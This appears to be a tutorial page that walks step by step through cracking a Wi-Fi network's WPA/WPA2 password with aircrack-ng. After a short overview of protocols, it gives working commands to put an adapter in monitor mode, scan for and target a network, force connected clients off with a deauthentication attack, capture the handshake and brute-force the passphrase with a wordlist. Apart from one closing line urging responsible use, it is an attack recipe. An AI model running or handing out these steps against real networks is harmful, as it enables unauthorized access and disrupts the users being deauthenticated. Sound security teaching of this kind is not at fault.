### ðŸ“Œ Basic Information

#### 1. Network Protocols

Understanding the protocols used in Wi-Fi networks is essential:

* **WEP (Wired Equivalent Privacy):** An obsolete protocol with significant security flaws.
* **WPA (Wi-Fi Protected Access):** Improved security over WEP but still vulnerable to weak passwords.
* **WPA2:** More secure than WPA, using AES/PSK encryption. Still susceptible to brute-force attacks if weak passwords are used.
* **WPA3:** The latest standard with enhanced protection against brute-force attacks. However, not all networks have adopted it yet.

#### 2. Encryption and Authentication Methods

* **TKIP (Temporal Key Integrity Protocol):** Legacy encryption with dynamic keys per packet; vulnerable to brute-force attacks.
* **AES (Advanced Encryption Standard):** A secure symmetric encryption method widely used in modern Wi-Fi networks.
* **PSK (Pre-Shared Key):** Commonly used for home networks, where a shared key is used for authentication. Vulnerable to brute-force attacks if the password is weak.

### ðŸ“‹ Requirements

Before proceeding, ensure you have the following:

1. **Aircrack-ng Suite:** Installed on your system.
2. **Wireless Adapter Compatible with Monitor Mode:** Ensure your adapter supports packet injection and monitor mode.

***

### ðŸš€ Step-by-Step Process

#### Step 1: Install Aircrack-ng

If you're not using Kali Linux, you'll need to install the `aircrack-ng` suite. Run the following command in your terminal:

```bash
sudo apt-get update
sudo apt-get install aircrack-ng
```

_Note:_ If you're using Kali Linux, `aircrack-ng` is pre-installed.

***

#### Step 2: Enable Monitor Mode

To capture packets from the target network, your wireless adapter must be in monitor mode. First, identify your wireless interface by running:

```bash
ip addr
```

Once you know the interface name (e.g., `wlan0`), enable monitor mode:

```bash
sudo airmon-ng start [interface]
```

_Example:_\
If your interface is `wlan0`, run:

```bash
sudo airmon-ng start wlan0
```

This will create a new interface, typically named `wlan0mon`.

***

#### Step 3: Scan for Wi-Fi Networks

Use `airodump-ng` to scan for nearby Wi-Fi networks:

```bash
sudo airodump-ng [interface + mon]
```

_Example:_\
If your monitor mode interface is `wlan0mon`, run:

```bash
sudo airodump-ng wlan0mon
```

This will display a list of available networks, including their BSSID (MAC address), channel, and encryption type. Note down the details of the target network.

***

#### Step 4: Capture the Handshake

Focus on the target network by capturing its handshake. Use the following command:

```bash
sudo airodump-ng -c [channel] --bssid [BSSID] -w [output file] [interface + mon]
```

_Example:_\
If the target network is on channel 6 with BSSID `00:11:22:33:44:55`, run:

```bash
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon
```

Leave this process running until the handshake is captured. You can verify the capture by checking the output file (`capture-01.cap`).

To speed up the handshake capture, deauthenticate connected clients using `aireplay-ng`:

```bash
sudo aireplay-ng -0 5 -a [BSSID] -c [STATION] [interface + mon]
```

_Example:_\
If the station (connected device) is `66:77:88:99:AA:BB`, run:

```bash
sudo aireplay-ng -0 5 -a 00:11:22:33:44:55 -c 66:77:88:99:AA:BB wlan0mon
```

***

#### Step 5: Crack the Password

Once you have the handshake file, use `aircrack-ng` to attempt cracking the password. Provide a wordlist for brute-forcing:

```bash
sudo aircrack-ng -w [wordlist file] [handshake file]
```

_Example:_\
If your wordlist is `rockyou.txt` and the handshake file is `capture-01.cap`, run:

```bash
sudo aircrack-ng -w rockyou.txt capture-01.cap
```

The tool will try each password in the wordlist until it finds a match or exhausts the list.

***

### ðŸ›  Tips and Best Practices

1. **Use a Strong Wordlist:** Tools like `hashcat` or online resources provide comprehensive wordlists.
2. **Optimize Your Wireless Adapter:** Ensure your adapter is compatible with packet injection and has good signal reception.
3. **Be Patient:** Cracking strong passwords may take time, depending on the complexity and length of the passphrase.

### Conclusion

By following these steps, you can learn how to crack a Wi-Fi network using `aircrack-ng`. Remember to use this knowledge responsibly and within legal boundaries. Happy learning!
